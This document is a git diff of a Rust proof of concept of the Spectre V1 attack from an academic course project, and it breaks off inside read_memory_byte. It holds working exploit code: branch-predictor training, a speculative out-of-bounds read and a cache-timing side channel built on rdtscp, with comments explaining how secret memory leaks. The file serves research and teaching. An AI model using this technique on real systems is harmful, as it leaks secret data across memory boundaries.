@@ -1,4 +1,13 @@
-// use rand::seq::SliceRandom;
+// Spectre V1 in Rust
+// 
+// From the U-M EECS 573 Project "In Rust We Trust?"
+//
+// Authors: Christopher Felix <chrisfx@umich.edu>
+//          Todd Austin <austin@umich.edu>
+//          Donayam Benti <donayam@umich.edu>
+//
+// Loosely adapted from: https://github.com/yadav-sachin/spectre-attack
+//
 use std::arch::asm;
 use std::arch::x86_64::*;
 use rand::Rng;
@@ -10,9 +19,8 @@ const TRAINING_LOOPS: usize = 100;
 const ATTACK_LEAP: u64 = 10;
 const INBETWEEN_DELAY: u64 = 100;
 
-// const CACHE_HIT_THRESHOLD: u64 = 35;
-// const LIKELY_THRESHOLD: u64 = (0.7 * NUM_TRIES as f64) as u64;
-
+// x86 read-time-stamp-counter instruction access, returns a 64-bit CPU cycle
+// timer, used for high-precision timing of cache hits and misses
 pub fn rdtscp() -> u64 {
     let eax: u32;
     let ecx: u32;
@@ -30,41 +38,82 @@ pub fn rdtscp() -> u64 {
     counter
 }
 
+// initialize attack support variables
 fn init_attack() -> (Vec<bool>, Vec<u8>) {
     let mut is_attack = vec![false; TRAINING_LOOPS as usize];
     for i in (0..TRAINING_LOOPS).step_by(ATTACK_LEAP as usize) {
         is_attack[i as usize] = true;
     }
 
+    // currently making the read order deterministic, doesn't seem to be
+    // a problem
     let mut attack_pattern: Vec<u8> = // (0..=255).collect();
        vec! [133u8, 211, 224, 148, 141, 69, 183, 14, 76, 90, 37, 52, 94, 26, 46, 250, 41, 220, 237, 143, 156, 111, 166, 201, 36, 81, 104, 89, 96, 255, 182, 22, 64, 47, 87, 209, 225, 142, 151, 226, 219, 152, 126, 130, 106, 178, 186, 221, 17, 158, 125, 150, 20, 79, 243, 160, 167, 101, 249, 71, 51, 247, 124, 213, 222, 44, 5, 48, 193, 231, 212, 132, 55, 215, 176, 109, 240, 218, 206, 177, 164, 63, 82, 173, 61, 252, 4, 103, 154, 175, 59, 197, 199, 99, 146, 1, 241, 122, 74, 30, 159, 188, 242, 138, 93, 6, 129, 134, 181, 140, 123, 18, 229, 187, 162, 163, 80, 202, 29, 203, 38, 73, 185, 60, 13, 194, 190, 184, 62, 214, 161, 95, 196, 0, 21, 58, 53, 239, 227, 169, 149, 34, 45, 43, 165, 248, 200, 195, 8, 136, 98, 253, 144, 192, 121, 11, 9, 170, 15, 35, 57, 147, 23, 216, 65, 28, 157, 85, 107, 232, 174, 88, 16, 223, 67, 135, 25, 112, 86, 97, 7, 155, 208, 145, 70, 168, 246, 230, 72, 10, 210, 31, 27, 40, 2, 245, 233, 205, 12, 128, 75, 33, 102, 172, 153, 139, 198, 39, 131, 100, 191, 118, 179, 254, 84, 3, 207, 77, 19, 92, 32, 113, 228, 91, 78, 244, 171, 120, 114, 105, 235, 110, 251, 83, 180, 236, 49, 217, 204, 24, 115, 117, 54, 127, 238, 119, 108, 66, 189, 234, 68, 116, 137, 42, 56, 50];
-    let mut rng = rand::thread_rng();
-    // attack_pattern.shuffle(&mut rng);
 
+    // STRANGELY, the attack doesn't work if the next three lines are deleted, likely due
+    // to its affect on the storage allocators ?!?!?!
+    let mut rng = rand::thread_rng();
     println!("is_attack = {:?}", is_attack);
     println!("attack_pattern = {:?}", attack_pattern);
 
     (is_attack, attack_pattern)
 }
 
+//
+//  Spectre V1 Attack Gadget
+//
+//  This function performs the Spectre V1 attack, successfully reading past
+//  the end of the array arr1[] to access the unrelated array secret[],
+//  details are below in the code
+//
 #[inline(never)]
 pub fn fetch_function(arr1: &Vec<u8>, arr1_len: &mut usize, arr2: &[u8], idx: usize) -> u8
 {
-    // This function simulates the behavior of the C++ `fetch_function`.
-    // It returns values from the shared memory, based on the `idx`.
+    // note that arr1 is passed in as a Vec, which puts the size of the
+    // structure into memory, if you pass arr1 as a simple array, the size is
+    // a constant, and you won't be able to delay the branch that checks if
+    // the array access is overflowing!
 
     let mut val: usize = 0;
-    // let arr1_ptr = arr1.as_ptr();
 
+    // redundant check to make sure that the Spectre array access that
+    // violates the array boundaries doesn't generate an exception in the
+    // non-speculative path of the program, this then requires that this
+    // Spectre V1 attack mispeculate past two branches: 1) the branch in the
+    // if statement below and 2) the internal compiler branch to check the
+    // arr1 slice access inside the scope of the if statement
     if idx < *arr1_len
     {
-      // unsafe { val = *arr1_ptr.add(idx) as usize; }
+      // get the array value, note that 1 out of 10 times this will be an
+      // access to the secret array using an out-of-bounds idx value, note
+      // that the other 9 accesses train the branch above and the the branch
+      // below that checks that the arr1 access is in bounds, if both
+      // mispeculate (and they will since the branch predictors just saw
+      // 9 times in a row that both branches were NOT taken), then the illegal
+      // access past the end of the rust array WILL HAPPEN 
       val = arr1[idx] as usize;
+
+      // now communicate the value read out to arr2, arr2 is just a huge array
+      // that is displaced from the cache before this function is called, by
+      // accessing it at val*512, we are assigning a specific cache block in
+      // the array to 'a', 'b', 'c', etc... Later we will read back the array
+      // to see check letter-associated line got referenced, and that will
+      // COMMUNICATE out the value of the ILLEGALLY read rust array value
       return arr2[val * 512]
     }
+
+    // quick note, while we are doing "stupid microarchitecture tricks" here,
+    // we still need everything to compute a real value or the incredibly
+    // smart rustc compiler will silently remove dead code, that is why you'll
+    // see everything doing non-commutative non-associative computation along
+    // with the microarchitecture tricks
     0
 }
 
+//
+// This function performs a single character read at the ILLEGAL arr1 address
+// arr1[target_idx], which surprise is actually an index past the end of arr1
+// into the secret array secret[]
 #[inline(never)]
 pub fn read_memory_byte(target_idx: usize, is_attack: &Vec<bool>, arr1: &Vec<u8>, arr1_len: &mut usize, arr2: &mut [u8], attack_pattern: &Vec<u8>, results: &mut [u32], idx: usize) -> u8 {
 
